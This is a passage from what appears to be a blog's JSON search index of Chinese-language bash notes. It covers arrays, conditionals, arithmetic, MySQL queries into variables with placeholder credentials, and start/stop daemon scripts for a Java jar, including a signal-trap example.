class=\"variable\">$&#123;STRING:2:5&#125;</span>   <span class=\"comment\"># 34567</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"Array-宣告\"><a href=\"#Array-宣告\" class=\"headerlink\" title=\"Array 宣告\"></a>Array 宣告</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">ARR=(123 456 789)</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">$&#123;ARR[2]&#125;</span>  <span class=\"comment\"># 789</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">$&#123;#ARR[@]&#125;</span>  <span class=\"comment\"># Array length</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"string\">\"<span class=\"variable\">$&#123;ARR[@]&#125;</span>\"</span></span><br><span class=\"line\"><span class=\"keyword\">do</span></span><br><span class=\"line\">   <span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$i</span>\"</span></span><br><span class=\"line\">   <span class=\"comment\"># or do whatever with individual element of the array</span></span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"Array-join-合併-動作\"><a href=\"#Array-join-合併-動作\" class=\"headerlink\" title=\"Array join(合併) 動作\"></a>Array join(合併) 動作</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> join_by &#123; <span class=\"built_in\">local</span> d=<span class=\"variable\">$1</span>; <span class=\"built_in\">shift</span>; <span class=\"built_in\">echo</span> -n <span class=\"string\">\"<span class=\"variable\">$1</span>\"</span>; <span class=\"built_in\">shift</span>; <span class=\"built_in\">printf</span> <span class=\"string\">\"%s\"</span> <span class=\"string\">\"<span class=\"variable\">$&#123;@/#/$d&#125;</span>\"</span>; &#125;</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://stackoverflow.com/questions/1527049/how-can-i-join-elements-of-an-array-in-bash\" target=\"_blank\" rel=\"noopener\">How can I join elements of an array in Bash? - Stack Overflow</a></p>\n<h2 id=\"if-條件判斷\"><a href=\"#if-條件判斷\" class=\"headerlink\" title=\"if 條件判斷\"></a>if 條件判斷</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> [  <span class=\"variable\">$&#123;#ERROR_ARR[@]&#125;</span> != 0 ]</span><br><span class=\"line\"><span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> xxxx</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"多個條件判斷\"><a href=\"#多個條件判斷\" class=\"headerlink\" title=\"多個條件判斷\"></a>多個條件判斷</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> [ -e <span class=\"variable\">$FIND_FILE_320</span> ] &amp;&amp; [ -e <span class=\"variable\">$FIND_FILE_192</span> ] &amp;&amp; [ -e <span class=\"variable\">$FIND_FILE_30</span> ] &amp;&amp; [  -e <span class=\"variable\">$FIND_FILE_ALBUM</span> ]</span><br><span class=\"line\"><span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> xxx</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"mysql-查詢寫回變數\"><a href=\"#mysql-查詢寫回變數\" class=\"headerlink\" title=\"mysql 查詢寫回變數\"></a>mysql 查詢寫回變數</h2><p>FIND_ARRAY=(<code>mysql -h xxx.xx.xx.xx -D xxxx -u xxx -p__password__ -se &quot;SELECT xxx FROM xxx WHERE  limit 100&quot;</code>)</p>\n<ul>\n<li><a href=\"https://www.cnblogs.com/iforever/p/4459857.html\" target=\"_blank\" rel=\"noopener\">shell处理mysql增、删、改、查 - 奔跑的Man - 博客园</a></li>\n<li><a href=\"http://mingxinglai.com/cn/2013/01/use-mysql-in-shell/\" target=\"_blank\" rel=\"noopener\">shell中读写mysql数据库 | 赖明星</a></li>\n<li><a href=\"https://stackoverflow.com/questions/49819640/how-concatenate-strings-with-a-newline\" target=\"_blank\" rel=\"noopener\">bash - How concatenate strings with a newline - Stack Overflow</a></li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">MYSQL_CMD=<span class=\"string\">\"/usr/bin/mysql -u ga_user -pxxx -h xxx --database=xxx -s\"</span></span><br><span class=\"line\">FIND_ARRAY=(`<span class=\"built_in\">echo</span> <span class=\"string\">\"SELECT xxx FROM xxxx WHERE ... and ..... &lt; DATE_ADD(now(),INTERVAL -3 DAY) ORDER BY id LIMIT 100\"</span> | <span class=\"variable\">$&#123;MYSQL_CMD&#125;</span>`)</span><br><span class=\"line\"></span><br><span class=\"line\">FIND_ARRAY=(`mysql -h xxx -D xxx -u xxx -pxxx -se <span class=\"string\">\"SELECT xxx FROM xxx WHERE xxx and DATE_ADD(now(),INTERVAL -3 DAY) LIMIT 100\"</span>`)</span><br></pre></td></tr></table></figure>\n<h2 id=\"function-宣告\"><a href=\"#function-宣告\" class=\"headerlink\" title=\"function 宣告\"></a>function 宣告</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> join_by &#123; <span class=\"built_in\">local</span> d=<span class=\"variable\">$1</span>; <span class=\"built_in\">shift</span>; <span class=\"built_in\">echo</span> -n <span class=\"string\">\"<span class=\"variable\">$1</span>\"</span>; <span class=\"built_in\">shift</span>; <span class=\"built_in\">printf</span> <span class=\"string\">\"%s\"</span> <span class=\"string\">\"<span class=\"variable\">$&#123;@/#/$d&#125;</span>\"</span>; &#125;</span><br><span class=\"line\">ERROR_SONG_ID_STRING=$(join_by , <span class=\"variable\">$&#123;ERROR_SONG_ID[@]&#125;</span>)</span><br><span class=\"line\">join_by , 1 2 3</span><br></pre></td></tr></table></figure>\n<h3 id=\"function-還傳段行字串\"><a href=\"#function-還傳段行字串\" class=\"headerlink\" title=\"function 還傳段行字串\"></a>function 還傳段行字串</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">a_function</span></span>() &#123;</span><br><span class=\"line\">    <span class=\"built_in\">echo</span> -e <span class=\"string\">\"Hello\\nworld\\n 1\"</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"Hello\"</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"world\"</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"Hello\\nworld 4\"</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> -e <span class=\"string\">\"Hello\\nworld\\n 1\"</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"Hello\"</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"world\"</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"Hello\\nworld 4\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">x=$(a_function <span class=\"string\">\"x\"</span>)</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"x-no-quotes&gt;\"</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">$x</span>                       <span class=\"comment\">#No new lines!</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"&lt;x-no-quotes\"</span></span><br></pre></td></tr></table></figure>\n<p><a href=\"https://stackoverflow.com/questions/27872069/how-to-debug-a-bash-function-that-returns-a-value-and-how-to-add-newlines-to-a/27872114\" target=\"_blank\" rel=\"noopener\">scripting - How to debug a bash function that returns a value, and how to add newlines to a variable? - Stack Overflow</a></p>\n<h3 id=\"shell-script-布林運算順序\"><a href=\"#shell-script-布林運算順序\" class=\"headerlink\" title=\"shell script 布林運算順序\"></a>shell script 布林運算順序</h3><p><a href=\"http://localhost:4000/blog/2019/11/06/shell-script-%E5%B8%83%E6%9E%97%E9%81%8B%E7%AE%97%E9%A0%86%E5%BA%8F/\" target=\"_blank\" rel=\"noopener\">shell script 布林運算順序 | 程式狂想筆記</a></p>\n<h2 id=\"有關\"><a href=\"#有關\" class=\"headerlink\" title=\"有關 *\"></a>有關 *</h2><p><a href=\"https://malagege.github.io/blog/2020/01/21/linux-bash-shell-%E6%9C%89%E9%97%9C-%E6%98%9F%E8%99%9F%E7%9A%84%E4%BA%8B%E6%83%85/\">linux bash / shell 有關 * 星號的事情 | 程式狂想筆記</a></p>\n<h2 id=\"shell-比較字串外面需要包\"><a href=\"#shell-比較字串外面需要包\" class=\"headerlink\" title=\"shell 比較字串外面需要包\"></a>shell 比較字串外面需要包</h2><blockquote>\n<p>if 常常遇到<code>[: ==: unary operator expected</code></p>\n<p>那是因為 == 左邊沒有抓到值，或是值為 null</p>\n<p>有兩種解決方法：</p>\n<ul>\n<li>if [ “$app-running” == “” ];</li>\n<li>if [[ $app-running == “” ]];</li>\n</ul>\n</blockquote>\n<p>參考:<a href=\"https://medium.com/micheh/linux-%E7%9A%84-shell-script-%E4%B8%AD-%E9%81%87%E5%88%B0-unary-operator-expected-%E7%9A%84%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95-3b4725d3fdf1\" target=\"_blank\" rel=\"noopener\">Linux 的 shell script 中，遇到 unary operator expected 的解決方法</a></p>\n<h2 id=\"變數運算\"><a href=\"#變數運算\" class=\"headerlink\" title=\"變數運算\"></a>變數運算</h2><p>最近使用 shell 做回圈做<code>${index+1}</code><br>結果沒有印出來<br>爬文有找到幾個方法</p>\n<ol>\n<li><p>declare -i來聲明整數變量</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">x=1</span><br><span class=\"line\">x+=1</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">$x</span></span><br><span class=\"line\"><span class=\"comment\"># 2</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>使用let命令</p>\n</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">i=1</span><br><span class=\"line\"><span class=\"built_in\">let</span> i+=1</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">$i</span></span><br><span class=\"line\"><span class=\"comment\"># 2</span></span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li>使用(())</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">i=1</span><br><span class=\"line\">((++i))</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">$i</span></span><br><span class=\"line\"><span class=\"comment\"># 2</span></span><br></pre></td></tr></table></figure>\n<ol start=\"4\">\n<li>使用expr命令</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">i=1</span><br><span class=\"line\">i=`expr <span class=\"variable\">$i</span> + 1`</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">$i</span></span><br><span class=\"line\"><span class=\"comment\"># 2</span></span><br></pre></td></tr></table></figure>\n<ol start=\"5\">\n<li>使用$(())</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">i=1</span><br><span class=\"line\">i=$((<span class=\"variable\">$i</span> + 1))</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">$i</span></span><br><span class=\"line\"><span class=\"comment\"># 2</span></span><br></pre></td></tr></table></figure>\n<ol start=\"6\">\n<li>使用$[]</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">i=1</span><br><span class=\"line\">i=$[<span class=\"variable\">$i</span> + 1]</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">$i</span></span><br><span class=\"line\"><span class=\"comment\"># 2</span></span><br></pre></td></tr></table></figure>\n<p>我比較喜歡 $(()) 和 (())</p>\n<p>參考來源: <a href=\"https://blog.csdn.net/Jerry_1126/article/details/52336340\" target=\"_blank\" rel=\"noopener\">Shell中整数自增的几种方式_杰瑞的专栏-CSDN博客</a></p>\n<h2 id=\"複製檔案\"><a href=\"#複製檔案\" class=\"headerlink\" title=\"複製檔案\"></a>複製檔案</h2><p><a href=\"https://malagege.github.io/blog/2020/01/10/cp-%E8%A4%87%E8%A3%BD%E6%AA%94%E6%A1%88%E5%8F%AF%E8%83%BD%E6%B2%92%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85/\">cp 複製檔案可能沒注意的事情 | 程式狂想筆記</a></p>\n<h2 id=\"shell-function-回傳只能數字\"><a href=\"#shell-function-回傳只能數字\" class=\"headerlink\" title=\"shell function 回傳只能數字\"></a>shell function 回傳只能數字</h2><p>一般我們看 shell script function return 回傳值只能是數字<br>沒法回傳字串，仔細想想也滿有道理的<br>因為正常程式執行結束會回傳 exit (int)<br>要確定程式是否有正確執行完成 正常執行完成會回傳0</p>\n<p>那有沒有回傳字串方法<br>我看到是用 function 裡面做 echo<br>外面用`這個符號去包<br>滿有趣的寫法</p>\n<h2 id=\"Shell-實作守護進程方法\"><a href=\"#Shell-實作守護進程方法\" class=\"headerlink\" title=\"Shell 實作守護進程方法\"></a>Shell 實作守護進程方法</h2><p>TODO: LINK </p>\n<h2 id=\"SHELL-大小寫\"><a href=\"#SHELL-大小寫\" class=\"headerlink\" title=\"SHELL 大小寫\"></a>SHELL 大小寫</h2><p><a href=\"https://linuxhint.com/bash_lowercase_uppercase_strings/\" target=\"_blank\" rel=\"noopener\">Bash lowercase and uppercase strings – Linux Hint</a></p>\n<h2 id=\"在-Shell-腳本中解析選項\"><a href=\"#在-Shell-腳本中解析選項\" class=\"headerlink\" title=\"在 Shell 腳本中解析選項\"></a>在 Shell 腳本中解析選項</h2><p><a href=\"https://liam.page/2016/11/11/ways-to-parse-arguments-in-shell-script/\" target=\"_blank\" rel=\"noopener\">在 Shell 腳本中解析選項 | 始終</a></p>\n<h2 id=\"相關連結\"><a href=\"#相關連結\" class=\"headerlink\" title=\"相關連結\"></a>相關連結</h2><p><a href=\"https://blog.csdn.net/weixin_37490221/article/details/80869792\" target=\"_blank\" rel=\"noopener\">Shell——你只需要了解这么多 - 枣面包的博客 - CSDN博客</a><br><a href=\"https://ithelp.ithome.com.tw/articles/10138639\" target=\"_blank\" rel=\"noopener\">[Shell Script] Day27-提高可讀性之函式寫法(三) - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a><br><a href=\"https://blog.csdn.net/ithomer/article/details/7954577\" target=\"_blank\" rel=\"noopener\">Linux Shell函数返回值 - 阳光岛主 - CSDN博客</a></p>\n","categories":["Linux"],"tags":["linux","sh","shell"]},{"title":"Shell 實作守護進程方法","url":"/blog/2021/01/28/Shell-%E5%AF%A6%E4%BD%9C%E5%AE%88%E8%AD%B7%E9%80%B2%E7%A8%8B%E6%96%B9%E6%B3%95/","content":"<p>Shell 實作守護進程方法</p>\n<a id=\"more\"></a>\n<h2 id=\"查詢-init-d-守護進程\"><a href=\"#查詢-init-d-守護進程\" class=\"headerlink\" title=\"查詢 init.d 守護進程\"></a>查詢 init.d 守護進程</h2><ul>\n<li><p><a href=\"https://stackoverflow.com/questions/11203483/run-a-java-application-as-a-service-on-linux\" target=\"_blank\" rel=\"noopener\">Run a Java Application as a Service on Linux - Stack Overflow</a></p>\n</li>\n<li><p><a href=\"http://dannysun-unknown.blogspot.com/2017/02/init-script-for-openwrtinit-script.html\" target=\"_blank\" rel=\"noopener\">迷途工程師: Init Script for OpenWrt，新增一個自己的init script</a></p>\n</li>\n<li><p><a href=\"https://github.com/fhd/init-script-template/blob/master/template\" target=\"_blank\" rel=\"noopener\">init-script-template/template at master · fhd/init-script-template</a><br>上面有用 ps -p 指令</p>\n</li>\n<li><p><a href=\"https://kknews.cc/zh-tw/code/4pnr3o2.html\" target=\"_blank\" rel=\"noopener\">最全的Linux進程監視命令ps的30個常用例子 - 每日頭條</a></p>\n</li>\n<li><p><a href=\"https://xie.infoq.cn/article/c3a40c88f95d3a1cb56045dc4\" target=\"_blank\" rel=\"noopener\">PHP守护进程 - InfoQ 写作平台</a></p>\n</li>\n<li><p><a href=\"https://blog.csdn.net/yangbodong22011/article/details/78650896\" target=\"_blank\" rel=\"noopener\">Linux 守护进程原理及实例（Redis、Nginx）_杨博东的博客-CSDN博客_redis守护进程</a></p>\n</li>\n<li><p><a href=\"https://stackoverflow.com/questions/10028820/bash-wait-with-timeout\" target=\"_blank\" rel=\"noopener\">linux - Bash: wait with timeout - Stack Overflow</a></p>\n</li>\n<li><p><a href=\"https://segmentfault.com/a/1190000022686414\" target=\"_blank\" rel=\"noopener\">springboot 打包（jar）部署在 Linux 環境 - SegmentFault 思否</a> &lt;–  覺得這個寫得很完整</p>\n</li>\n</ul>\n<h2 id=\"記錄網路上找的不錯寫法\"><a href=\"#記錄網路上找的不錯寫法\" class=\"headerlink\" title=\"記錄網路上找的不錯寫法\"></a>記錄網路上找的不錯寫法</h2><p>以下參考<a href=\"https://segmentfault.com/a/1190000022686414\" target=\"_blank\" rel=\"noopener\">springboot 打包（jar）部署在 Linux 環境 - SegmentFault 思否</a><br>這個應該也能改成一般程式執行</p>\n<p><strong>注意!!這邊不是無限loop</strong><br>估記是Java 程式做 loop</p>\n<figure class=\"highlight sh\"><figcaption><span>start.sh</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\">AppName=ruoyi.jar</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#JVM參數</span></span><br><span class=\"line\">JVM_OPTS=<span class=\"string\">\"-Dname=<span class=\"variable\">$AppName</span>  -Duser.timezone=Asia/Shanghai -Xms512M -Xmx512M -XX:PermSize=256M -XX:MaxPermSize=512M -XX:+HeapDumpOnOutOfMemoryError -XX:+PrintGCDateStamps  -XX:+PrintGCDetails -XX:NewRatio=1 -XX:SurvivorRatio=30 -XX:+UseParallelGC -XX:+UseParallelOldGC\"</span></span><br><span class=\"line\">APP_HOME=`<span class=\"built_in\">pwd</span>`</span><br><span class=\"line\">LOG_PATH=<span class=\"variable\">$APP_HOME</span>/logs/<span class=\"variable\">$AppName</span>.<span class=\"built_in\">log</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> [ <span class=\"string\">\"<span class=\"variable\">$1</span>\"</span> = <span class=\"string\">\"\"</span> ];</span><br><span class=\"line\"><span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> -e <span class=\"string\">\"\\033[0;31m 未輸入操作名 \\033[0m  \\033[0;34m &#123;start|stop|restart|status&#125; \\033[0m\"</span></span><br><span class=\"line\">    <span class=\"built_in\">exit</span> 1</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> [ <span class=\"string\">\"<span class=\"variable\">$AppName</span>\"</span> = <span class=\"string\">\"\"</span> ];</span><br><span class=\"line\"><span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> -e <span class=\"string\">\"\\033[0;31m 未輸入應用名 \\033[0m\"</span></span><br><span class=\"line\">    <span class=\"built_in\">exit</span> 1</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> start()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    PID=`ps -ef |grep java|grep <span class=\"variable\">$AppName</span>|grep -v grep|awk <span class=\"string\">'&#123;print $2&#125;'</span>`</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> [ x<span class=\"string\">\"<span class=\"variable\">$PID</span>\"</span> != x<span class=\"string\">\"\"</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$AppName</span> is running...\"</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        nohup java -jar  <span class=\"variable\">$JVM_OPTS</span> target/<span class=\"variable\">$AppName</span> &gt; /dev/null 2&gt;&amp;1 &amp;</span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">\"Start <span class=\"variable\">$AppName</span> success...\"</span></span><br><span class=\"line\">    <span class=\"keyword\">fi</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> stop()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"Stop <span class=\"variable\">$AppName</span>\"</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    PID=<span class=\"string\">\"\"</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"title\">query</span></span>()&#123;</span><br><span class=\"line\">        PID=`ps -ef |grep java|grep <span class=\"variable\">$AppName</span>|grep -v grep|awk <span class=\"string\">'&#123;print $2&#125;'</span>`</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    query</span><br><span class=\"line\">    <span class=\"keyword\">if</span> [ x<span class=\"string\">\"<span class=\"variable\">$PID</span>\"</span> != x<span class=\"string\">\"\"</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">        <span class=\"built_in\">kill</span> -TERM <span class=\"variable\">$PID</span></span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$AppName</span> (pid:<span class=\"variable\">$PID</span>) exiting...\"</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> [ x<span class=\"string\">\"<span class=\"variable\">$PID</span>\"</span> != x<span class=\"string\">\"\"</span> ]</span><br><span class=\"line\">        <span class=\"keyword\">do</span></span><br><span class=\"line\">            sleep 1</span><br><span class=\"line\">            query</span><br><span class=\"line\">        <span class=\"keyword\">done</span></span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$AppName</span> exited.\"</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$AppName</span> already stopped.\"</span></span><br><span class=\"line\">    <span class=\"keyword\">fi</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> restart()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    stop</span><br><span class=\"line\">    sleep 2</span><br><span class=\"line\">    start</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> status()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    PID=`ps -ef |grep java|grep <span class=\"variable\">$AppName</span>|grep -v grep|wc -l`</span><br><span class=\"line\">    <span class=\"keyword\">if</span> [ <span class=\"variable\">$PID</span> != 0 ];<span class=\"keyword\">then</span></span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$AppName</span> is running...\"</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$AppName</span> is not running...\"</span></span><br><span class=\"line\">    <span class=\"keyword\">fi</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"variable\">$1</span> <span class=\"keyword\">in</span></span><br><span class=\"line\">    start)</span><br><span class=\"line\">    start;;</span><br><span class=\"line\">    stop)</span><br><span class=\"line\">    stop;;</span><br><span class=\"line\">    restart)</span><br><span class=\"line\">    restart;;</span><br><span class=\"line\">    status)</span><br><span class=\"line\">    status;;</span><br><span class=\"line\">    *)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">esac</span></span><br></pre></td></tr></table></figure>\n<p>另外一種<br>看試強制關閉<br><figure class=\"highlight sh\"><figcaption><span>start_init.sh</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/sh</span></span><br><span class=\"line\">JAR_NAME=ruoyi.jar</span><br><span class=\"line\"></span><br><span class=\"line\">tpid=`ps -ef|grep <span class=\"variable\">$JAR_NAME</span>|grep -v grep|grep -v <span class=\"built_in\">kill</span>|awk <span class=\"string\">'&#123;print $2&#125;'</span>`</span><br><span class=\"line\"><span class=\"keyword\">if</span> [ <span class=\"variable\">$&#123;tpid&#125;</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">'Stop Process...'</span></span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\">sleep 5</span><br><span class=\"line\">tpid=`ps -ef|grep <span class=\"variable\">$JAR_NAME</span>|grep -v grep|grep -v <span class=\"built_in\">kill</span>|awk <span class=\"string\">'&#123;print $2&#125;'</span>`</span><br><span class=\"line\"><span class=\"keyword\">if</span> [ <span class=\"variable\">$&#123;tpid&#125;</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">'Kill Process!'</span></span><br><span class=\"line\"><span class=\"built_in\">kill</span> -9 <span class=\"variable\">$tpid</span></span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">'Stop Success!'</span></span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\"></span><br><span class=\"line\">tpid=`ps -ef|grep <span class=\"variable\">$JAR_NAME</span>|grep -v grep|grep -v <span class=\"built_in\">kill</span>|awk <span class=\"string\">'&#123;print $2&#125;'</span>`</span><br><span class=\"line\"><span class=\"keyword\">if</span> [ <span class=\"variable\">$&#123;tpid&#125;</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">'App is running.'</span></span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">'App is NOT running.'</span></span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\"></span><br><span class=\"line\">rm -f tpid</span><br><span class=\"line\">nohup java -jar ./<span class=\"variable\">$JAR_NAME</span> &gt;/dev/null 2&gt;&amp;1 &amp;</span><br><span class=\"line\"><span class=\"built_in\">echo</span> $! &gt; tpid</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">'Start Success!'</span></span><br></pre></td></tr></table></figure></p>\n<p>這個應該可以改成一般非 Java 程式排程<br>再搭配關閉訊號控制程式，是不是就是完美關閉腳本<br>好吧，其實我還是覺得 Systemd 才是最佳解決方案</p>\n<h2 id=\"關閉訊號控制程式\"><a href=\"#關閉訊號控制程式\" class=\"headerlink\" title=\"關閉訊號控制程式\"></a>關閉訊號控制程式</h2><p>最近有看到可以傳送關閉訊號控制程式跑完進程關閉程式</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">mp3convert</span></span> () &#123;</span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">\"mp3convert...\"</span>; sleep 5; <span class=\"built_in\">echo</span> <span class=\"string\">\"mp3convert done...\"</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">PreTrap</span></span>() &#123;</span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">\"in trap\"</span></span><br><span class=\"line\">  QUIT=1</span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">\"exiting trap...\"</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">CleanUp</span></span>() &#123;</span><br><span class=\"line\">  <span class=\"comment\">### Since 'wait $PID' can be interrupted by ^C, we need to protected it</span></span><br><span class=\"line\">  <span class=\"comment\">### by the 'kill' loop  ==&gt; double/triple control-C problem.</span></span><br><span class=\"line\">  <span class=\"keyword\">while</span> <span class=\"built_in\">kill</span> -0 <span class=\"variable\">$PID</span> &gt;&amp; /dev/null; <span class=\"keyword\">do</span> <span class=\"built_in\">wait</span> <span class=\"variable\">$PID</span>; <span class=\"built_in\">echo</span> <span class=\"string\">\"check again\"</span>; <span class=\"keyword\">done</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">### This won't work (A simple wait $PID is vulnerable to double control C)</span></span><br><span class=\"line\">  <span class=\"comment\"># wait $PID</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> [ ! -z <span class=\"variable\">$QUIT</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">     <span class=\"built_in\">echo</span> <span class=\"string\">\"clean up...\"</span></span><br><span class=\"line\">     <span class=\"built_in\">exit</span></span><br><span class=\"line\"> <span class=\"keyword\">fi</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">trap</span> PreTrap SIGINT SIGTERM SIGTSTP</span><br><span class=\"line\"><span class=\"comment\">#trap CleanUp EXIT</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> loop <span class=\"keyword\">in</span> 1 2 3; <span 